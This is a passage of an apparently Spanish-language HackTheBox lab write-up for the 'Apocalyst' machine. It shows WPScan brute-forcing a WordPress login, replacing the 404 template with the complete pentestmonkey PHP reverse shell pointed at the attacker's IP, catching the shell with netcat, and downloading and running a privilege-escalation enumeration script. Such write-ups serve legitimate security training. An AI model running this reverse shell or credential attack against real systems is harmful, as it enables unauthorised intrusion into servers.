+[+] Performing password attack on Wp Login against 1 user/s
+[SUCCESS] - falaraki / Transclisiation                          
+Trying falaraki / total Time: 00:00:20 &lt;=====================                                 &gt; (335 / 821) 40.80%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: falaraki, Password: Transclisiation
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Nov 26 22:43:27 2021
+[+] Requests Done: 524
+[+] Cached Requests: 5
+[+] Data Sent: 158.678 KB
+[+] Data Received: 18.992 MB
+[+] Memory used: 245.012 MB
+[+] Elapsed time: 00:00:34
+</span></code></pre></div></div>
+
+<p>Ya tenemos las credenciales de acceso al portal de login de <strong><em>WordPress</em></strong> y como siempre, antes que nada, vamos a guardarlas y posteriormente a tratar de acceder.</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-login1.png" alt=""></p>
+
+<p>Ya para ingresar a la máquina víctima, vamos a editar la plantilla 404 desde <strong>Appearance &gt; Editor &gt; Templates &gt; 404 Template</strong>.</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-shell.png" alt=""></p>
+
+<p>Vamos a cambiar su contenido por una <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a> que descargamos y modificamos los parámetros.</p>
+
+<p><img src="/assets/images/htb-apocalyst/apocalyst-shell1.png" alt=""></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP</span>
+<span class="c1">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  The author accepts no liability</span>
+<span class="c1">// for damage caused by this tool.  If these terms are not acceptable to you, then</span>
+<span class="c1">// do not use this tool.</span>
+<span class="c1">//</span>
+<span class="c1">// In all other respects the GPL version 2 applies:</span>
+<span class="c1">//</span>
+<span class="c1">// This program is free software; you can redistribute it and/or modify</span>
+<span class="c1">// it under the terms of the GNU General Public License version 2 as</span>
+<span class="c1">// published by the Free Software Foundation.</span>
+<span class="c1">//</span>
+<span class="c1">// This program is distributed in the hope that it will be useful,</span>
+<span class="c1">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
+<span class="c1">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
+<span class="c1">// GNU General Public License for more details.</span>
+<span class="c1">//</span>
+<span class="c1">// You should have received a copy of the GNU General Public License along</span>
+<span class="c1">// with this program; if not, write to the Free Software Foundation, Inc.,</span>
+<span class="c1">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>
+<span class="c1">//</span>
+<span class="c1">// This tool may be used for legal purposes only.  Users take full responsibility</span>
+<span class="c1">// for any actions performed using this tool.  If these terms are not acceptable to</span>
+<span class="c1">// you, then do not use this tool.</span>
+<span class="c1">//</span>
+<span class="c1">// You are encouraged to send comments, improvements or suggestions to</span>
+<span class="c1">// me at pentestmonkey@pentestmonkey.net</span>
+<span class="c1">//</span>
+<span class="c1">// Description</span>
+<span class="c1">// -----------</span>
+<span class="c1">// This script will make an outbound TCP connection to a hardcoded IP and port.</span>
+<span class="c1">// The recipient will be given a shell running as the current user (apache normally).</span>
+<span class="c1">//</span>
+<span class="c1">// Limitations</span>
+<span class="c1">// -----------</span>
+<span class="c1">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span>
+<span class="c1">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span>
+<span class="c1">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span>
+<span class="c1">//</span>
+<span class="c1">// Usage</span>
+<span class="c1">// -----</span>
+<span class="c1">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span>
+
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.14.27'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS</span>
+<span class="nv">$port</span> <span class="o">=</span> <span class="mi">443</span><span class="p">;</span>       <span class="c1">// CHANGE THIS</span>
+<span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="c1">//</span>
+<span class="c1">// Daemonise ourself if possible to avoid zombies later</span>
+<span class="c1">//</span>
+
+<span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise</span>
+<span class="c1">// our php process and avoid zombies.  Worth a try...</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
+	<span class="c1">// Fork and have the parent process exit</span>
+	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Make the current process a session leader</span>
+	<span class="c1">// Will only succeed if we forked</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Change to a safe directory</span>
+<span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+
+<span class="c1">// Remove any umask we inherited</span>
+<span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">//</span>
+<span class="c1">// Do the reverse shell...</span>
+<span class="c1">//</span>
+
+<span class="c1">// Open reverse connection</span>
+<span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Spawn shell process</span>
+<span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from</span>
+   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to</span>
+   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to</span>
+<span class="p">);</span>
+
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Set everything to non-blocking</span>
+<span class="c1">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nx">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// Check for end of TCP connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Check for end of STDOUT</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Wait until a command is end down $sock, or some</span>
+	<span class="c1">// command output is available on STDOUT or STDERR</span>
+	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+	<span class="c1">// If we can read from the TCP socket, send</span>
+	<span class="c1">// data to process's STDIN</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDOUT</span>
+	<span class="c1">// send data down tcp connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDERR</span>
+	<span class="c1">// send data down tcp connection</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+<span class="c1">// Like print, but does nothing if we've daemonised ourself</span>
+<span class="c1">// (I can't figure out how to redirect STDOUT like a proper daemon)</span>
+<span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span> 
+</code></pre></div></div>
+
+<p>Damos click en <strong>Update File</strong>, nos ponemos en escucha por el puerto 443 y tratamos de acceder a la ruta <code class="language-plaintext highlighter-rouge">http://apocalyst.htb/?p=404.php</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.46] 35352
+Linux apocalyst 4.4.0-62-generic <span class="c">#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 05:05:04 up  1:36,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+</span></code></pre></div></div>
+
+<p>Antes que nada, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos. A este punto nos encontramos dentro de la máquina como el usuario <strong>www-data</strong> y podemos visualizar la flag (user.txt). Por lo que nos queda enumerar un poco el sistema para ver una forma de escalar privilegios. En esta ocasión vamos a hacer uso de la herramienta <a href="https://github.com/diego-treitos/linux-smart-enumeration">linux-smart-enumeration</a>, por lo que la descargamos y la transferimos a la máquina víctima dentro de un directorio donde tengamos permisos de lectura, escritura y ejecución.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.46 - - <span class="o">[</span>26/Nov/2021 23:07:36] <span class="s2">"GET /lse.sh HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@apocalyst:/home/falaraki<span class="nv">$ </span><span class="nb">cd</span> /dev/shm/
+www-data@apocalyst:/dev/shm<span class="nv">$ </span>wget http://10.10.14.27/lse.sh
+<span class="nt">--2021-11-27</span> 05:12:35--  http://10.10.14.27/lse.sh
+Connecting to 10.10.14.27:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 43570 <span class="o">(</span>43K<span class="o">)</span> <span class="o">[</span>text/x-sh]
+Saving to: <span class="s1">'lse.sh'</span>
+
+lse.sh                           100%[<span class="o">=======================================================&gt;]</span>  42.55K   151KB/s    <span class="k">in </span>0.3s    
+
+2021-11-27 05:12:36 <span class="o">(</span>151 KB/s<span class="o">)</span> - <span class="s1">'lse.sh'</span> saved <span class="o">[</span>43570/43570]
+
+www-data@apocalyst:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x lse.sh
+www-data@apocalyst:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 44
+<span class="nt">-rwxrwxrwx</span> 1 www-data www-data 43570 Nov 27 05:05 lse.sh
+www-data@apocalyst:/dev/shm<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Procedemos a ejecutar la herramienta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@apocalyst:/dev/shm<span class="nv">$ </span>./lse.sh                                                                                            
+<span class="nt">---</span>                                                                                                                              
+If you know the current user password, write it here to check <span class="nb">sudo </span>privileges: www-data
+<span class="nt">---</span>                                                                                                                              
+                                                                                                                                 
+ LSE Version: 3.7                                                                                                                
+                                                                                                                                 
+        User: www-data                                                                                                           
+     User ID: 33                                                                                                                 
+    Password: <span class="k">******</span>                                                                                                             
+        Home: /var/www                                                                                                           
+        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin      
+       <span class="nb">umask</span>: 0000                                                                                                               
+                                                                                                                                 
+    Hostname: apocalyst                                                                                                          
+       Linux: 4.4.0-62-generic                                                                                                   
+Distribution: Ubuntu 16.04.2 LTS                                                                                                 
+Architecture: x86_64                                                                                                             
+                                                                                                                                 
+<span class="o">==================================================================(</span> <span class="nb">users</span> <span class="o">)=====</span>
+<span class="o">[</span>i] usr000 Current user groups............................................. <span class="nb">yes</span><span class="o">!</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> usr010 Is current user <span class="k">in </span>an administrative group?..................... nope
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> usr020 Are there other <span class="nb">users </span><span class="k">in </span>administrative <span class="nb">groups</span>?................. <span class="nb">yes</span><span class="o">!</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> usr030 Other <span class="nb">users </span>with shell.......................................... <span class="nb">yes</span><span class="o">!</span>
+<span class="o">[</span>i] usr040 Environment information......................................... skip
+<span class="o">[</span>i] usr050 Groups <span class="k">for </span>other users.......................................... skip                                                 
+<span class="o">[</span>i] usr060 Other users..................................................... skip                                                 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> usr070 PATH variables defined inside /etc.............................. <span class="nb">yes</span><span class="o">!</span>                                                 
+<span class="o">[!]</span> usr080 Is <span class="s1">'.'</span> <span class="k">in </span>a PATH variable defined inside /etc?.................. nope
+<span class="o">===================================================================(</span> <span class="nb">sudo</span> <span class="o">)=====</span>
+<span class="o">[!]</span> sud000 Can we <span class="nb">sudo </span>without a password?................................. nope
+<span class="o">[!]</span> sud010 Can we list <span class="nb">sudo </span>commands without a password?................... nope
+<span class="o">[!]</span> sud020 Can we <span class="nb">sudo </span>with a password?.................................... nope
+<span class="o">[!]</span> sud030 Can we list <span class="nb">sudo </span>commands with a password?...................... nope
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sud040 Can we <span class="nb">read </span>sudoers files?...................................... nope
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sud050 Do we know <span class="k">if </span>any other <span class="nb">users </span>used <span class="nb">sudo</span>?........................ <span class="nb">yes</span><span class="o">!</span>
+<span class="o">============================================================(</span> file system <span class="o">)=====</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> fst000 Writable files outside user<span class="s1">'s home.............................. yes!
+[*] fst010 Binaries with setuid bit........................................ yes!
+[!] fst020 Uncommon setuid binaries........................................ nope
+[!] fst030 Can we write to any setuid binary?.............................. nope
+[*] fst040 Binaries with setgid bit........................................ skip
+[!] fst050 Uncommon setgid binaries........................................ skip
+[!] fst060 Can we write to any setgid binary?.............................. skip
+[*] fst070 Can we read /root?.............................................. nope
+[*] fst080 Can we read subdirectories under /home?......................... yes!
+[*] fst090 SSH files in home directories................................... nope
+[*] fst100 Useful binaries................................................. yes!
+[*] fst110 Other interesting files in home directories..................... nope
+[!] fst120 Are there any credentials in fstab/mtab?........................ nope
+[*] fst130 Does '</span>www-data<span class="s1">' have mail?...................................... nope
+[!] fst140 Can we access other users mail?................................. nope
+[*] fst150 Looking for GIT/SVN repositories................................ nope
+[!] fst160 Can we write to critical files?................................. yes!
+---
+-rw-rw-rw- 1 root root 1637 Jul 26  2017 /etc/passwd
+---
+[!] fst170 Can we write to critical directories?........................... nope
+[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
+[!] fst190 Can we read any backup?......................................... nope
+[!] fst200 Are there possible credentials in any shell history file?....... nope
+[!] fst210 Are there NFS exports with '</span>no_root_squash<span class="s1">' option?............. nope
+[*] fst220 Are there NFS exports with '</span>no_all_squash<span class="s1">' option?.............. nope
+[i] fst500 Files owned by user '</span>www-data<span class="s1">'.................................. skip
+[i] fst510 SSH files anywhere.............................................. skip
+[i] fst520 Check hosts.equiv file and its contents......................... skip
+[i] fst530 List NFS server shares.......................................... skip
+[i] fst540 Dump fstab file................................................. skip
+=================================================================( system )=====
+[i] sys000 Who is logged in................................................ skip
+[i] sys010 Last logged in users............................................ skip
+[!] sys020 Does the /etc/passwd have hashes?............................... nope
+[!] sys022 Does the /etc/group have hashes?................................ nope
+[!] sys030 Can we read shadow files?....................................... nope
+[*] sys040 Check for other superuser accounts.............................. nope
+[*] sys050 Can root user log in via SSH?................................... yes!
+[i] sys060 List available shells........................................... skip
+[i] sys070 System umask in /etc/login.defs................................. skip
+[i] sys080 System password policies in /etc/login.defs..................... skip
+===============================================================( security )=====
+[*] sec000 Is SELinux present?............................................. nope
+[*] sec010 List files with capabilities.................................... yes!
+[!] sec020 Can we write to a binary with caps?............................. nope
+[!] sec030 Do we have all caps in any binary?.............................. nope
+[*] sec040 Users with associated capabilities.............................. nope
+[!] sec050 Does current user have capabilities?............................ skip
+[!] sec060 Can we read the auditd log?..................................... nope
+========================================================( recurrent tasks )=====
+[*] ret000 User crontab.................................................... nope
+[!] ret010 Cron tasks writable by user..................................... nope
+[*] ret020 Cron jobs....................................................... yes!
+[*] ret030 Can we read user crontabs....................................... nope
+[*] ret040 Can we list other user cron tasks?.............................. nope
+[*] ret050 Can we write to any paths present in cron jobs.................. yes!
+[!] ret060 Can we write to executable paths present in cron jobs........... nope
+[i] ret400 Cron files...................................................... skip
+[*] ret500 User systemd timers............................................. nope
+[!] ret510 Can we write in any system timer?............................... nope
+[i] ret900 Systemd timers.................................................. skip
+================================================================( network )=====
+[*] net000 Services listening only on localhost............................ yes!
+[!] net010 Can we sniff traffic with tcpdump?.............................. nope
+[i] net500 NIC and IP information.......................................... skip
+[i] net510 Routing table................................................... skip
+[i] net520 ARP table....................................................... skip
+[i] net530 Nameservers..................................................... skip
+[i] net540 Systemd Nameservers............................................. skip
+[i] net550 Listening TCP................................................... skip
+[i] net560 Listening UDP................................................... skip
+===============================================================( services )=====
+[!] srv000 Can we write in service files?.................................. nope
+[!] srv010 Can we write in binaries executed by services?.................. nope
+[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
+[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
+[*] srv040 Upstart files not belonging to root............................. nope
+[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
+[i] srv400 Contents of /etc/inetd.conf..................................... skip
+[i] srv410 Contents of /etc/xinetd.conf.................................... skip
+[i] srv420 List /etc/xinetd.d if used...................................... skip
+[i] srv430 List /etc/init.d/ permissions................................... skip
+[i] srv440 List /etc/rc.d/init.d permissions............................... skip
+[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
+[i] srv460 List /etc/init/ permissions..................................... skip
+[!] srv500 Can we write in systemd service files?.......................... nope
+[!] srv510 Can we write in binaries executed by systemd services?.......... nope
+[*] srv520 Systemd files not belonging to root............................. nope
+[i] srv900 Systemd config files permissions................................ skip
+===============================================================( software )=====
+[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
+[!] sof010 Can we connect to MySQL as root without password?............... nope
+[!] sof015 Are there credentials in mysql_history file?.................... nope
+[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
+[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
+[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
+[*] sof030 Installed apache modules........................................ yes!
+[!] sof040 Found any .htpasswd files?...................................... nope
+[!] sof050 Are there private keys in ssh-agent?............................ nope
+[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
+[!] sof070 Can we write to a ssh-agent socket?............................. nope
+[!] sof080 Can we write to a gpg-agent socket?............................. nope
+[!] sof090 Found any keepass database files?............................... nope
+[!] sof100 Found any '</span>pass<span class="s1">' store directories?............................. nope
+[!] sof110 Are there any tmux sessions available?.......................... nope
+[*] sof120 Are there any tmux sessions from other users?................... nope
+[!] sof130 Can we write to tmux session sockets from other users?.......... nope
+[!] sof140 Are any screen sessions available?.............................. nope
+[*] sof150 Are there any screen sessions from other users?................. nope
+[!] sof160 Can we write to screen session sockets from other users?........ nope
+[i] sof500 Sudo version.................................................... skip
+[i] sof510 MySQL version................................................... skip
+[i] sof520 Postgres version................................................ skip
+[i] sof530 Apache version.................................................. skip
+[i] sof540 Tmux version.................................................... skip
+[i] sof550 Screen version.................................................. skip
+=============================================================( containers )=====
+[*] ctn000 Are we in a docker container?................................... nope
+[*] ctn010 Is docker available?............................................ nope
+[!] ctn020 Is the user a member of the '</span>docker<span class="s1">' group?..................... nope
+[*] ctn200 Are we in a lxc container?...................................... nope
+[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
+==============================================================( processes )=====
+[i] pro000 Waiting for the process monitor to finish....................... yes!
+[i] pro001 Retrieving process binaries..................................... yes!
+[i] pro002 Retrieving process users........................................ yes!
+[!] pro010 Can we write in any process binary?............................. nope
+[*] pro020 Processes running with root permissions......................... yes!
